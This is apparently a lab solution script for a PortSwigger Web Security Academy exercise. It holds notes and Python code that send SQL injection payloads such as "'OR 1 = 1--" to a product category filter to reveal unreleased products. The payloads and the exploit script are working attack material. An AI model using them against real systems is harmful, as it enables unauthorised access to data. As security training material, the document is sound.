'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

1. Vulnerability:  Product Category (SQLi)

2. SQL Query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1

3. Goal:  Display unreleased products

4. Exploit: SELECT * FROM products WHERE category = 'Pets' AND released = 0--' AND released = 1

or 

SELECT * FROM products WHERE category = 'Pets' OR 1 = 1--' AND released = 1


Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-01/sqli-lab-01.py

'''


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    try: 
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri + payload, verify=False)

    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        
        # Optional filling Manually
        url = 'https://<Edit This>.web-security-academy.net'  #Update Domain here
        payload = "'OR 1 = 1--"

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
